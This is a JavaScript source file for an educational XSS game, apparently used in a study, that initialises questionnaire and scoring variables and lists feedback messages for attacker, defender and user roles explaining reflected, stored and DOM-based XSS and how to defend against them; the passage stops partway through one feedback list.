$(document).ready(function() {
    gameStatusPP = false;
    infoPopUp = false;
    interactivityInfoPopUp = false;
    playerName = "";
    playerNameResponse = "";
    playerEMail = "";
    playerEMailConfirm = "";
    preGameTR = "";
    postGameTR = "";
    avatarId = 100;
    prevAvatarId = 100;
    roleId = 100;
    prevRoleId = 100;

    prePost = 0;
    gender = 0;
    genderButtonClickedCount = 0;
    studyPreprogram = 0;
    studyPreprogramButtonClickedCount = 0;
    prevPreGamingExperience = 0;
    prevPreGamingExperienceButtonClickedCount = 0;
    prevXSSKnowledge = 0;
    prevXSSKnowledgeButtonClickedCount = 0;
    preXSSQuestion1 = 0;
    preXSSQuestion1ButtonsClickedCount = 0;
    preXSSQuestion2 = 0;
    preXSSQuestion2ButtonsClickedCount = 0;
    preXSSQuestion3 = 0;
    preXSSQuestion3ButtonsClickedCount = 0;
    preXSSQuestion4 = 0;
    preXSSQuestion4ButtonsClickedCount = 0;
    preXSSQuestion5 = 0;
    preXSSQuestion5ButtonsClickedCount = 0;
    xssPreMotivLikert1 = 0;
    xssPreMotivLikert1ButtonsClickedCount = 0;
    xssPreTXGExpectationsLikert1 = 0;
    xssPreTXGExpectationsLikert1ButtonsClickedCount = 0;
    xssPreGBLLikert1 = 0;
    xssPreGBLLikert1ButtonsClickedCount = 0;
    preGameStatus = false;
    postGameStatus = false;

    postXSSQuestion1ButtonClickedCount = 0;
    postXSSQuestion1 = 0;
    postXSSQuestion2ButtonClickedCount = 0;
    postXSSQuestion2 = 0;
    postXSSQuestion3ButtonClickedCount = 0;
    postXSSQuestion3 = 0;
    postXSSQuestion4ButtonClickedCount = 0;
    postXSSQuestion4 = 0;
    postXSSQuestion5ButtonClickedCount = 0;
    postXSSQuestion5 = 0;



    xssPostKnowledgeLikert1ButtonClickedCount = 0;
    xssPostKnowledgeLikert1 = 0;
    xssPostKnowledgeLikert2ButtonClickedCount = 0;
    xssPostKnowledgeLikert2 = 0;
    xssPostKnowledgeLikert3ButtonClickedCount = 0;
    xssPostKnowledgeLikert3 = 0;


    xssEngMotivationLikert1ButtonClickedCount = 0;
    xssEngMotivationLikert1 = 0;
    xssEngMotivationLikert2ButtonClickedCount = 0;
    xssEngMotivationLikert2 = 0;
    xssEngMotivationLikert3ButtonClickedCount = 0;
    xssEngMotivationLikert3 = 0;
    xssEngMotivationLikert4ButtonClickedCount = 0;
    xssEngMotivationLikert4 = 0;



    xssCogLoadLikert1ButtonClickedCount = 0;
    xssCogLoadLikert1 = 0;
    xssCogLoadLikert2ButtonClickedCount = 0;
    xssCogLoadLikert2 = 0;
    xssCogLoadLikert3ButtonClickedCount = 0;
    xssCogLoadLikert3 = 0;
    xssCogLoadLikert4ButtonClickedCount = 0;
    xssCogLoadLikert4 = 0;

    xssUIUXLikert1ButtonClickedCount = 0;
    xssUIUXLikert1 = 0;
    xssUIUXLikert2ButtonClickedCount = 0;
    xssUIUXLikert2 = 0;
    xssUIUXLikert3ButtonClickedCount = 0;
    xssUIUXLikert3 = 0;
    xssUIUXLikert4ButtonClickedCount = 0;
    xssUIUXLikert4 = 0;
    xssUIUXLikert5ButtonClickedCount = 0;
    xssUIUXLikert5 = 0;
    xssUIUXLikert6ButtonClickedCount = 0;
    xssUIUXLikert6 = 0;
    xssUIUXLikert7ButtonClickedCount = 0;
    xssUIUXLikert7 = 0;

    xssPTRAppLikert1ButtonClickedCount = 0;
    xssPTRAppLikert1 = 0;
    xssPTRAppLikert2ButtonClickedCount = 0;
    xssPTRAppLikert2 = 0;
    xssPTRAppLikert3ButtonClickedCount = 0;
    xssPTRAppLikert3 = 0;
    xssPTRAppLikert4ButtonClickedCount = 0;
    xssPTRAppLikert4 = 0;
    xssPTRAppLikert5ButtonClickedCount = 0;
    xssPTRAppLikert5 = 0;


    timeLimitInMinutes = 0;
    timeLimitInSeconds = timeLimitInMinutes * 60;
    questionTile1Selected = false;
    questionTile2Selected = false;
    questionTile3Selected = false;
    questionTile4Selected = false;
    currentLevelNo = 1;
    initialLevelDraw = true;
    playerScoreInGame = 0;
    playerScoreInLevel = 0;
    playerScoreInQuestion = 0;
    rolesPlayed = [];
    LastPlayedRole = "";
    questionTileTextLength = 115;
    timerInterval = null;
    timerSimulatorZoneInterval = null;
    insideSimulatorAction1 = false;
    insideSimulatorAction2 = false;
    initialTimerStarted = false;
    initialSimulatorZoneTimerStarted = false;
    serverToken = "";
    awardedBadgeId = 100;
    completionTime = 0;
    playerRolesPlayed = "";
    leaderboardResponse = [];
    simulatorZoneTimeLimitInSeconds = 0;
    simulatorZoneInsideTime = "";
    simulatorZoneAnswersArray = [];
    simulatorZoneAnswersString = "";
    playerQuestionAnswersString = "";
    availableTimeLimit = 0;
    gameStatus = "";
    gameStatusTest = "";
    gameNotPlayed = false;
    tileLocations = [];
    dataCapturedConfirmation = "";
    playMusic = false;
    levelsCompleted = [];
    levelMultiplier = 5;

    preGameQuestionnaireAnswersRecorded = false;
    postGameQuestionnaireAnswersRecorded = false;
    playerEmailAvatarRecorded = false;
    playerEmailCodeRecorded = false;
    prePostGameQuestionnaireCompleted = false;

    XSSCheck = "";
    AttackerReflectedSkillsValue = 0;
    AttackerStoredSkillsValue = 0;
    AttackerDOMBasedSkillsValue = 0;
    AttackerSimZoneSkillsValue = 0;

    DefenderReflectedSkillsValue = 0;
    DefenderStoredSkillsValue = 0;
    DefenderDOMBasedSkillsValue = 0;
    DefenderSimZoneSkillsValue = 0;

    UserReflectedSkillsValue = 0;
    UserStoredSkillsValue = 0;
    UserDOMBasedSkillsValue = 0;
    UserSimZoneSkillsValue = 0;

    OverallReflectedSkillsValue = 0;
    OverallStoredSkillsValue = 0;
    OverallDOMBasedSkillsValue = 0;
    OverallSimZoneSkillsValue = 0;

    SimZoneSkills1AddedtoBar = false;
    SimZoneSkills2AddedtoBar = false;
    SimZoneStoredXSSSubmitButtonClickedCounter = 0;
    XSSAlertScriptSubmitted = false;

    affirmativeAttackerFeedbackList = ["Mission complete! As the Attacker, you’ve mastered the art of exploiting XSS vulnerabilities with precision and insight.", "You've hacked your way through—Attacker role complete! Your understanding of how XSS attacks work is razor-sharp.", "Attacker role accomplished. You've stepped into the adversary's mind and exposed the mechanics of XSS with skill.", "Infiltration successful! You’ve completed the Attacker role and unlocked key insights into web security flaws.", "You played the Attacker like a pro. Role complete—and your grasp of XSS tactics is now sharper than ever."];
    affirmativeAttackerProgressFeedbackList = ["Keep pushing forward! You're building valuable skills that will help you understand web vulnerabilities better.", "Stay focused! The more you experiment, the closer you get to mastering the art of XSS attacks.", "You're making great progress! Each step brings you closer to becoming an expert in exploiting web vulnerabilities.", "Keep at it! Every challenge you face in this game is a step toward sharpening your skills as a cybersecurity attacker.", "Stay sharp! Your persistence is key—each move you make is teaching you more about the world of XSS."];


    affirmativeDefenderFeedbackList = ["Defender role complete! You've fortified the system and shown strong awareness of XSS vulnerabilities.", "Great job! As the Defender, you’ve demonstrated smart strategies to guard against XSS threats.", "You held the line! Completing the Defender role shows your skill in identifying and neutralizing web-based attacks.", "System secured! You've successfully played the Defender and strengthened your cybersecurity instincts.", "Defender mission accomplished. Your ability to spot and block XSS attempts is commendable."];
    affirmativeDefenderProgressFeedbackList = ["Keep up the great work! Every defensive measure you implement brings you closer to mastering web security.", "Stay vigilant! The more you learn, the better equipped you'll be to safeguard against XSS attacks.", "You're doing an amazing job! Each challenge you face is a step toward becoming a skilled defender of web applications.", "Keep going! Your persistence in securing web apps will make a real difference in protecting users from threats.", "Stay focused! The stronger your defenses, the more you'll understand how to thwart potential attackers."];

    affirmativeUserFeedbackList = ["Well done! You've experienced how an attacker could exploit XSS vulnerabilities to compromise your data.", "Great job! You've learned firsthand the potential dangers of XSS and how attackers might target users like you.", "Awesome work! You’ve discovered how XSS attacks can affect your experience and what to look out for as a user.", "Congratulations! You've seen how an XSS vulnerability can impact the security of web applications from a user’s perspective.", "Nice job! You've gained crucial knowledge on how malicious scripts can hijack user interactions and how to stay safe."];
    affirmativeUserProgressFeedbackList = ["You're doing great! Every step you take helps you understand how to stay safe while using web applications.", "Keep going! The more you learn, the better you'll be at identifying potential threats and protecting yourself online.", "Nice job! Your efforts are building crucial awareness that will keep you safe in the digital world.", "Stay focused! Understanding the risks is the first step to becoming a more secure user of web applications.", "You're on the right track! The knowledge you're gaining now will make you more cautious and confident as a web user."];


    affirmativeOverallFeedbackList = [
        "Well done! You’ve successfully completed The XSS Game—an excellent achievement!",
        "Congratulations on finishing The XSS Game! Your effort and dedication really paid off.",
        "Great job! You’ve completed The XSS Game and demonstrated strong persistence throughout.",
        "Success! You’ve wrapped up The XSS Game—an impressive milestone in your learning journey.",
        "The XSS Game is complete—congrats! Your achievement shows commitment and growth."
    ];

    affirmativeOverallLearningFeedbackList = [
        "Fantastic work! By playing all three roles, you’ve gained a complete perspective on how XSS attacks occur, how developers defend against them, and how users can be impacted.",
        "Congratulations! You’ve learned to think like an attacker, defend like a developer, and stay aware like a user—covering the full spectrum of XSS threats.",
        "Well done! Completing all roles has given you practical insights into exploiting, preventing, and experiencing XSS vulnerabilities.",
        "Great job! You’ve developed a balanced understanding of XSS attacks—from the mindset of the adversary, to the strategies of defense, to the risks faced by everyday users.",
        "Success! You now understand XSS attacks from multiple viewpoints, equipping you with the skills to detect, mitigate, and raise awareness of web security threats."
    ];

    affirmativeOverallProgressFeedbackList = [
        "Keep going—you’re doing great!",
        "Nice work, stay motivated and continue playing!",
        "You’re on the right track—don’t stop now!",
        "Great effort so far, keep pushing forward!",
        "You’re making solid progress—keep it up!"
    ];

    affirmativeRoleProgressFeedbackList = [
        "Great job making progress! Each step you take brings new perspectives on XSS into focus.",
        "You’re advancing well—continue exploring to gain deeper insight into all attacker, defender and user viewpoints.",
        "Nice work so far! Each role you complete adds a new layer of understanding to the XSS challenge.",
        "Strong progress! Exploring the remaining roles will help you connect the attacker, defender, and user perspectives.",
        "Well done! You’ve unlocked part of the picture—finishing all roles will complete your cybersecurity journey."
    ];

    levelAttackerProgressFeedbackList = ["TXG is generating insights based on your attack strategies to help you refine your approach. You'll receive a detailed summary at the end of the level.", "TXG is customizing insights according to your playstyle to help improve your XSS tactics. A final briefing will be provided once you finish the level.", "TXG is adapting insights to match your current attack methods. At the end of the level, you'll receive a comprehensive overview of your progress.", "TXG is creating personalized insights to align with your attacking techniques. Expect a full review of your performance when you complete the level.", "TXG is tailoring insights based on your unique playing style to enhance your understanding of XSS. A thorough debrief will follow once you finish the level."];
    levelDefenderProgressFeedbackList = ["TXG is generating insights tailored to your defensive approach to help you improve your security measures. You’ll receive a detailed summary once you complete the level.", "TXG is adjusting insights according to your playstyle to enhance your defense strategies. A comprehensive review will be provided at the end of the level.", "TXG is creating insights based on how you defend against XSS attacks. At the conclusion of the level, you'll be given a full breakdown of your performance.", "TXG is customizing defense insights based on your style of play to help you strengthen your security. You’ll receive an in-depth evaluation when you finish the level.", "TXG is working on personalized insights to match your defensive tactics and improve your overall security knowledge. A final briefing will be delivered once the level ends."];
    levelUserProgressFeedbackList = ["TXG is generating insights based on your experience to help you understand how XSS attacks might impact you. A full review of your progress will be provided once you finish the level.", "TXG is tailoring insights to match your actions as a web user, offering valuable insights into potential risks. You’ll receive a comprehensive debrief once the level concludes.", "TXG is customizing insights according to how you interact with web applications to help you stay safe. A thorough overview will be shared at the end of the level.", "TXG is preparing personalized insights based on your unique approach to web usage. Expect a detailed summary of your journey once you complete the level.", "TXG is working on generating insights based on your interactions as a web user to help you spot potential threats. A final assessment will be given when the level ends."];


    incorrectAttackerAnswersList = [];
    incorrectDefenderAnswersList = [];
    incorrectUserAnswersList = [];
    correctAttackerAnswersList = [];
    correctDefenderAnswersList = [];
    correctUserAnswersList = [];

    suggestedRoleList = [];
    suggestedAttackerLevels = "";
    suggestedAttackerSteps = "";

    suggestedDefenderLevels = "";
    suggestedDefenderSteps = "";


    suggestedUserLevels = "";
    suggestedUserSteps = "";

    tabSelectedOverall = "";
    tabSelectedAttacker = "";
    tabSelectedDefender = "";
    tabSelectedUser = "";

    tabSelectedAffirmativeOverall = "";
    tabSelectedAffirmativeAttacker = "";
    tabSelectedAffirmativeDefender = "";
    tabSelectedAffirmativeUser = "";

    levelAttackerRefStoredDomXSSList = ["\n • It is important to understand the differences between reflected, stored, and DOM-based XSS attacks. Although they share some similarities, each type differs in terms of technical setup, modus operandi, and payload delivery. Mastering these variations allows players to strategically choose the most effective exploit based on the scenario’s structure and available entry points.",
        "\n • Understanding how reflected, stored, and DOM-based XSS attacks differ is essential. While they may seem similar at a glance, their technical execution, behavior, and methods of delivery set them apart. In TXG, this knowledge empowers players in the attacker role to select the best approach for each situation.",
        "\n • Recognizing the distinct characteristics of reflected, stored, and DOM-based XSS attacks is crucial. Despite overlapping concepts, each involves unique technical mechanics and delivery methods. For attackers in TXG, adapting tactics based on these nuances is key to successful exploitation.",
        "\n • Each type of XSS attack—reflected, stored, and DOM-based—comes with its own set of mechanics and operational flow. Though they share core ideas, their execution and payload behaviors vary. TXG's attacker role rewards those who learn these differences and exploit scenarios accordingly.",
        "\n • Reflected, stored, and DOM XSS attacks may appear related, but they operate quite differently under the hood. The techniques used, how the payload is delivered, and where the vulnerability lies are all distinct. In TXG, understanding these elements enhances the attacker’s ability to exploit vulnerabilities effectively.",
        "\n • While reflected, stored, and DOM-based XSS attacks are all part of the same threat category, they involve different methods of execution and exploitation. Learning how each one functions gives TXG players the edge to make precise, scenario-driven choices during gameplay."
    ];

    levelAttackerRefStoredDomXSSListAdded = false;


    levelDefenderRefStoredDomXSSList = ["\n • As a defender, it’s crucial to understand the distinctions between reflected, stored, and DOM-based XSS attacks. While these attack types may appear similar at first glance, they differ in how they are executed, the way the payload is delivered, and their underlying mechanisms. Gaining a solid grasp of these variations enables defenders to recognize vulnerabilities more accurately and implement the appropriate safeguards for each scenario.",
        "\n • As a defender, knowing the differences between reflected, stored, and DOM-based XSS attacks is essential. Though they may look alike, each one functions differently in terms of payload execution and attack strategy. Understanding these differences helps defenders detect and block threats more effectively.",
        "\n • Defenders must be able to differentiate between reflected, stored, and DOM-based XSS attacks. Each type has its own method of execution, delivery path, and technical nuances. By learning how they operate, you’ll be better equipped to apply the correct countermeasures in any given context.",
        "\n • Understanding the unique characteristics of reflected, stored, and DOM-based XSS attacks is a key skill for defenders. Even though these attacks share some traits, the way they’re delivered and triggered varies. This knowledge empowers you to secure each entry point more effectively.",
        "\n • As someone protecting web applications, it's important to grasp how reflected, stored, and DOM-based XSS differ. They may seem alike, but each has a distinct method of exploitation and delivery. Mastery of these types allows for stronger, more targeted defenses.",
        "\n • To defend successfully , it’s vital to recognize how reflected, stored, and DOM-based XSS attacks operate differently. Despite their similarities, their techniques and payload behaviors vary. Knowing these distinctions enables precise and proactive vulnerability mitigation."
    ];

    levelDefenderRefStoredDomXSSListAdded = false;

    levelUserRefStoredDomXSSList = ["\n • From a user's perspective, reflected, stored, and DOM-based XSS attacks can lead to significant harm. Reflected XSS attacks can trick users into clicking on malicious links, leading to data theft or unauthorized actions on their behalf. Stored XSS attacks can cause long-term issues, as malicious scripts are saved and executed every time a user accesses the compromised page, potentially stealing sensitive information like login credentials. DOM-based XSS attacks can directly manipulate the page content, leading to unexpected behavior, such as redirecting users to malicious sites or displaying fake content. In all cases, users may unknowingly expose personal data, resulting in identity theft, financial loss, or further exploitation.",
        "\n • From a user’s point of view, reflected, stored, and DOM-based XSS attacks can have serious consequences. Reflected XSS tricks users into interacting with malicious links, potentially causing data breaches or unauthorized activities. Stored XSS can create ongoing risks as the harmful scripts remain in the system, stealing sensitive data each time the page is accessed. DOM-based XSS can alter page elements, causing disruptions like redirects or fake content, putting users’ personal data at risk, leading to identity theft or financial damage.",
        "\n • From a user’s perspective, XSS attacks—whether reflected, stored, or DOM-based—pose substantial threats. Reflected XSS can deceive users into clicking on harmful links, leading to the theft of personal data or unintended actions. Stored XSS attacks are more persistent, with malicious scripts being executed every time the user visits the affected page, risking the theft of login details or other sensitive information. DOM-based XSS can manipulate page content, redirecting users to dangerous sites or displaying fraudulent content, exposing users to identity theft or financial loss.",
        "\n • From a user’s view, reflected, stored, and DOM-based XSS attacks can cause serious damage. Reflected XSS can trick users into clicking on dangerous links, leading to the loss of sensitive information or unauthorized actions. Stored XSS attacks persist over time, executing harmful scripts each time the user visits a page, putting login credentials and personal data at risk. DOM-based XSS can alter page elements, resulting in actions like malicious redirects or fake content, leading to identity theft or financial harm.",
        "\n • From a user’s perspective, reflected, stored, and DOM-based XSS attacks are dangerous and can cause serious harm. Reflected XSS attacks can deceive users into clicking on malicious links, resulting in data theft or unauthorized actions. Stored XSS attacks are more persistent, as harmful scripts are stored and executed repeatedly, risking the theft of sensitive user data. DOM-based XSS attacks manipulate page content, often redirecting users to harmful sites or displaying fake content, leading to personal data exposure and financial loss.",
        "\n • From the viewpoint of a user, reflected, stored, and DOM-based XSS attacks can lead to significant risks. Reflected XSS can trick users into clicking malicious links, potentially resulting in data theft or unauthorized actions. Stored XSS attacks are dangerous over time, as malicious scripts continue to run whenever the page is accessed, putting login credentials and personal information at risk. DOM-based XSS can alter the content displayed on a page, leading to unexpected behavior like redirects or fake content, leaving users vulnerable to exploitation, identity theft, and financial losses."
    ];

    levelUserRefStoredDomXSSListAdded = false;


    levelUserProtectXSSList = ["\n • From a user’s perspective, protecting against reflected, stored, and DOM-based XSS attacks involves being cautious and aware of potential threats. Reflected XSS can be mitigated by avoiding clicking on suspicious links or URLs, especially from unknown sources. For stored XSS, users should ensure that the websites they interact with are trusted and regularly updated. DOM-based XSS can be prevented by avoiding actions that could expose personal information, such as entering sensitive data on untrusted websites or interacting with pages that seem unusual. Additionally, using security-focused browser extensions or keeping your browser updated can offer an extra layer of protection against these types of attacks. Being vigilant and practicing safe browsing habits can significantly reduce the risk of falling victim to XSS exploits.",
        "\n • As a user, protecting yourself from reflected, stored, and DOM-based XSS attacks requires caution and awareness. Reflected XSS risks can be reduced by steering clear of suspicious links and URLs, especially those from unknown sources. With stored XSS, it's important to ensure that the websites you visit are secure and frequently updated. For DOM-based XSS, avoid entering sensitive information on questionable sites or engaging with unusual web pages. Using browser extensions designed for security and keeping your browser up-to-date can further protect against these threats. Staying vigilant and practicing safe online habits is essential to avoid falling victim to XSS attacks.",
        "\n • To protect yourself as a user from reflected, stored, and DOM-based XSS attacks, be mindful of potential risks. Reflected XSS can be avoided by not clicking on unfamiliar links or URLs, especially those from suspicious sources. With stored XSS, ensure the websites you visit are trustworthy and regularly maintain their security. To prevent DOM-based XSS, avoid submitting sensitive data on sites that seem unreliable or interacting with unfamiliar pages. Consider using security-focused browser add-ons and keeping your browser updated to add an extra layer of protection. By staying alert and practicing safe browsing, you can significantly lower your chances of being affected by XSS exploits.",
        "\n • From a user’s point of view, protecting against reflected, stored, and DOM-based XSS attacks involves being cautious when browsing the web. Reflected XSS attacks can be avoided by refraining from clicking on suspicious or unfamiliar links. For stored XSS, it’s important to only use well-known, secure websites that are regularly updated. To guard against DOM-based XSS, refrain from entering sensitive information on suspicious sites or interacting with unfamiliar content. Using security-enhancing browser tools and ensuring your browser is up to date adds an extra layer of defense. Practicing good security hygiene will help you avoid falling victim to XSS attacks.",
        "\n • From a user’s perspective, avoiding reflected, stored, and DOM-based XSS attacks requires being vigilant online. Reflected XSS risks can be minimized by avoiding clicking on links or URLs from untrustworthy sources. For stored XSS, ensure that you use reliable websites and that they maintain regular updates. To prevent DOM-based XSS, be cautious when entering personal information on untrusted websites or interacting with suspicious content. Installing security-focused browser extensions and keeping your browser current can help protect you. By practicing safe browsing, you can effectively reduce the likelihood of falling victim to XSS attacks.",
        "\n • As a user, defending against reflected, stored, and DOM-based XSS attacks means staying alert to potential dangers. Reflected XSS can be avoided by not clicking on questionable links or URLs from unfamiliar sources. With stored XSS, ensure that the websites you interact with are reputable and kept up to date. DOM-based XSS risks can be minimized by being cautious when entering sensitive data on unreliable sites or engaging with strange web pages. Installing browser extensions with enhanced security features and keeping your browser updated can provide extra protection. By staying vigilant and practicing safe browsing, you can reduce the chances of encountering XSS attacks."
    ];

    levelUserProtectXSSListAdded = false;




    levelDefenderInputEscapeXSSList = ["\n • In order to defend against XSS attacks, user input should never be trusted, as attackers can exploit it to inject malicious scripts. It is essential to escape and sanitize all user input before processing it, ensuring that any potentially harmful characters are neutralized. This includes using context-aware escaping mechanisms, such as HTML, JavaScript, and URL encoding, to prevent the injection of malicious code. By thoroughly validating and sanitizing input, defenders can significantly reduce the risk of XSS vulnerabilities and protect users from harmful exploits.",
        "\n • To protect against XSS attacks, it’s crucial not to trust any user input, as attackers may use it to inject malicious scripts. Input must be escaped and sanitized before being processed, ensuring that dangerous characters are handled correctly. This involves using methods like HTML, JavaScript, and URL encoding to block potential exploits. By implementing strict validation and sanitization practices, defenders can reduce XSS risks and safeguard users from harmful attacks.",
        "\n • Defending against XSS requires treating user input as untrusted, since attackers can manipulate it to inject malicious code. Escaping and sanitizing all user inputs is a key practice, ensuring harmful characters are removed. This includes applying context-specific escaping methods like HTML or JavaScript encoding to prevent attacks. By validating and sanitizing inputs properly, defenders can lower the chances of XSS vulnerabilities and enhance user security.",
        "\n • To prevent XSS attacks, it’s important to treat all user input as potentially malicious. All input should be escaped and sanitized before processing to eliminate dangerous characters. Utilizing context-specific escaping methods such as HTML or JavaScript encoding helps to block malicious code injections. Effective input validation and sanitization can reduce the risk of XSS vulnerabilities and ensure users are protected.",
        "\n • User input must never be trusted to defend against XSS attacks, as attackers can exploit it to inject harmful scripts. Escaping and sanitizing input before processing is crucial to remove any dangerous characters. Employing methods like HTML, JavaScript, and URL encoding ensures the input is safe for use. By consistently validating and sanitizing inputs, defenders can prevent XSS exploits and protect users from security breaches.",
        "\n • To defend against XSS attacks, all user input must be treated as untrusted, as malicious actors can manipulate it to inject scripts. Escaping and sanitizing input is necessary to ensure harmful characters are neutralized before processing. This involves applying context-based escaping mechanisms such as HTML or JavaScript encoding to prevent code injection. Thorough input validation and sanitization are key to reducing XSS vulnerabilities and keeping users safe."
    ];

    levelDefenderInputEscapeXSSListAdded = false;

    levelDefenderProtectXSSList = ["\n • Protecting against reflected, stored, and DOM-based XSS attacks requires different strategies tailored to each type of vulnerability. For reflected XSS, input validation and context-aware escaping are crucial to prevent the immediate execution of malicious scripts. In the case of stored XSS, proper sanitization and escaping of input before storing it in the database is essential to ensure malicious code isn’t executed when retrieved. For DOM-based XSS, the focus should be on securing the client-side code by thoroughly validating user input, and by avoiding unsafe DOM manipulation methods. Regular security audits and using security-focused libraries, such as Content Security Policy (CSP), can further enhance protection against these diverse XSS attack vectors.",
        "\n • Each type of XSS attack—reflected, stored, and DOM-based—requires a distinct defense strategy. To guard against reflected XSS, validating and escaping user input is critical to prevent malicious scripts from executing. For stored XSS, ensuring proper sanitization of input before saving it in the database helps mitigate the risk of later execution. In DOM-based XSS, validating user input and securing the client-side code by avoiding unsafe DOM methods is vital. Regular security reviews and the use of tools like Content Security Policy (CSP) can further strengthen protection.",
        "\n • Defending against reflected, stored, and DOM-based XSS attacks demands tailored approaches for each vulnerability. With reflected XSS, the key is to validate and escape input to stop scripts from running. In stored XSS, ensuring input is properly sanitized before saving it prevents the execution of malicious code. For DOM-based XSS, focus on securing the client-side by validating input and avoiding dangerous DOM manipulations. Utilizing tools like Content Security Policy (CSP) and conducting regular security checks will boost defense across these attack types.",
        "\n • Each form of XSS attack—reflected, stored, and DOM-based—requires a specialized defense approach. Reflected XSS demands strong input validation and escaping techniques to block malicious scripts. With stored XSS, sanitizing input before it’s saved in a database is key to preventing future execution of harmful code. For DOM-based XSS, protecting the client-side code by validating user input and avoiding risky DOM manipulations is essential. Regular audits and employing Content Security Policy (CSP) can enhance security against these attack forms.",
        "\n • To effectively defend against reflected, stored, and DOM-based XSS attacks, different strategies must be implemented for each type. For reflected XSS, proper input validation and context-sensitive escaping are necessary to block malicious scripts. With stored XSS, sanitizing input before storing it in a database ensures that harmful code isn't triggered. For DOM-based XSS, securing client-side code through validation and safe DOM manipulation practices is crucial. Leveraging security tools like Content Security Policy (CSP) and conducting frequent security audits can significantly improve defenses.",
        "\n • Protecting against reflected, stored, and DOM-based XSS requires tailored defense strategies for each type. In reflected XSS, validating and escaping input is essential to prevent malicious code from executing. For stored XSS, sanitizing input before storing it prevents the risk of execution when retrieved. DOM-based XSS protection focuses on validating input and avoiding unsafe DOM manipulation on the client side. Regular security audits and utilizing tools like Content Security Policy (CSP) can enhance the overall defense against these threats."
    ];

    levelDefenderProtectXSSListAdded = false;

    levelDefenderDOMResourcesList = ["\n • From a defender’s perspective, understanding which resources can be manipulated through the DOM is essential for identifying potential vulnerabilities. By securing elements like form fields, cookies, and local storage, defenders can prevent attackers from injecting malicious scripts that could alter page behavior or steal sensitive user data. Implementing proper input validation and context-aware sanitization helps mitigate the risks of such attacks.",
        "\n • To defend effectively, it’s important to understand which resources in the DOM are vulnerable to manipulation. Securing inputs, cookies, and local storage ensures that attackers cannot inject harmful scripts that disrupt page functionality or steal sensitive information. Employing strong validation and sanitization practices greatly reduces the risk of such threats.",
        "\n • From a defender’s point of view, identifying which DOM resources are susceptible to manipulation is critical for securing the application. By protecting form fields, cookies, and local storage, defenders can block attackers from injecting malicious scripts that could compromise the page or steal sensitive data. Validating input and applying context-specific sanitization are key strategies to mitigate these risks.",
        "\n • To effectively safeguard against XSS attacks, defenders must understand which resources in the DOM can be manipulated. Securing elements such as form inputs, cookies, and local storage prevents attackers from injecting scripts that could change the page’s behavior or access sensitive data. Proper input validation and sanitization are essential to defending against these threats.",
        "\n • Defenders must know which DOM resources can be manipulated to identify and secure potential vulnerabilities. By securing form fields, cookies, and local storage, they can block malicious scripts from altering the page’s functionality or stealing user data. Ensuring input is validated and sanitized properly is crucial to mitigating these risks.",
        "\n • From a defense perspective, it’s important to identify and secure DOM resources that attackers might manipulate. By safeguarding elements like form fields, cookies, and local storage, defenders can prevent the injection of malicious scripts that could disrupt functionality or expose sensitive data. Input validation and careful sanitization are critical in reducing the likelihood of successful attacks."
    ];

    levelDefenderDOMResourcesListAdded = false;

    levelAttackerXSSEffectsList = ["\n • It is important to understand the effects of XSS attacks, in terms of what harm they can and cannot cause. As an attacker, recognizing the potential impact—such as session hijacking, data theft, or unauthorized actions—helps in crafting effective payloads that exploit specific weaknesses. At the same time, knowing the limitations of XSS ensures more realistic and targeted strategies that align with the scope of the vulnerability.",
        "\n • Understanding both the potential damage and the boundaries of XSS attacks is essential. For an attacker , identifying impacts like stealing session cookies or manipulating user actions supports smarter payload design. Awareness of XSS limitations leads to more strategic and feasible exploit choices.",
        "\n • Knowing what XSS attacks can achieve—and what they can’t—is key for an attacker. This understanding enables players to target specific vulnerabilities with precision, such as hijacking sessions or injecting malicious scripts, while avoiding unrealistic or ineffective approaches.",
        "\n • As an attacker, grasping the scope and limitations of XSS attacks is crucial. Effective exploits rely on knowing the exact damage possible, from compromising user sessions to executing unauthorized actions, ensuring a focused and practical offensive strategy.",
        "\n • It’s vital to assess the real-world impact of XSS attacks, not just their theoretical capabilities. Attackers who understand how and when XSS can cause harm—like data leaks or user impersonation—can better tailor their payloads to the scenario at hand.",
        "\n • Recognizing the reach and restrictions of XSS attacks sharpens attacker performance. Strategic payload creation hinges on understanding both the types of harm XSS can inflict and the technical limits that shape how those attacks succeed or fail."
    ];

    levelAttackerXSSEffectsListAdded = false;


    levelAttackerDOMResourcesList = ["\n • From an attacker’s perspective, knowing which resources can be manipulated via the DOM is key to finding possible attack points. By targeting elements like form fields, cookies, or local storage, attackers can inject harmful scripts that alter page functionality or capture sensitive user data from the browser environment.",
        "\n • To successfully execute a DOM-based XSS attack, an attacker must be aware of which parts of the webpage can be controlled. Focusing on dynamic resources such as input fields, cookies, or local storage, the attacker can embed malicious scripts that affect the page’s operations or siphon off private information from the user’s system.",
        "\n • Understanding which resources in the DOM are vulnerable is critical for an attacker to exploit the page. By exploiting inputs, cookies, or local storage, the attacker can execute malicious scripts to alter page content or steal sensitive data from the browser environment.",
        "\n • The key to a DOM-based XSS attack lies in identifying resources that can be manipulated. By targeting elements like user inputs, cookies, or local storage, an attacker can inject scripts that modify the page or gather sensitive information from the user’s browser.",
        "\n • For an attacker, recognizing which DOM resources can be manipulated is essential for identifying attack surfaces. By focusing on elements like input forms, cookies, or local storage, malicious scripts can be inserted to either change the page’s behavior or extract sensitive data from the user’s environment.",
        "\n • In DOM-based XSS, attackers need to recognize which resources can be controlled. By targeting dynamic elements such as input fields, cookies, or local storage, the attacker can inject harmful code that alters the page or steals sensitive information from the user’s environment."
    ];

    levelAttackerDOMResourcesListAdded = false;

    levelAttackerFlawlessCompletionList = ["\n Congratulations, you have flawlessly completed the attacker role! \n While your understanding of XSS attacks is exceptional, it's always beneficial to revisit the Attacker role to reinforce the concepts you've learned.",
        "\n Well done! You've flawlessly completed the attacker role. \n Even though your knowledge of XSS attacks is impressive, revisiting the Attacker role can help strengthen your grasp on the concepts.",
        "\n Great job! You’ve nailed the attacker role flawlessly. \n However, reinforcing your understanding by replaying the role will solidify your knowledge of XSS attacks even further.",
        "\n Awesome work! Completing the attacker role perfectly shows your strong grasp of XSS attacks. \n Still, playing through the role again can help you reinforce and deepen your understanding.",
        "\n Fantastic! You’ve aced the attacker role flawlessly. \nTo truly master XSS attacks, revisiting the role will provide even more insight and help solidify your understanding.",
        "\n Congratulations on completing the attacker role flawlessly! \n While your knowledge of XSS attacks is solid, revisiting the role will further strengthen the concepts you've learned."
    ];



    levelDefenderFlawlessCompletionList = ["\n Congratulations, you have completed the defender role flawlessly!!! \nWhile your defence knowledge on XSS attacks is impressive, it is always good to replay the Defender role to reinforce the concepts learnt.",
        "\n Great job completing the Defender role without a hitch! \n Your understanding of XSS defence strategies is commendable, but revisiting the Defender role can help solidify what you’ve learned.",
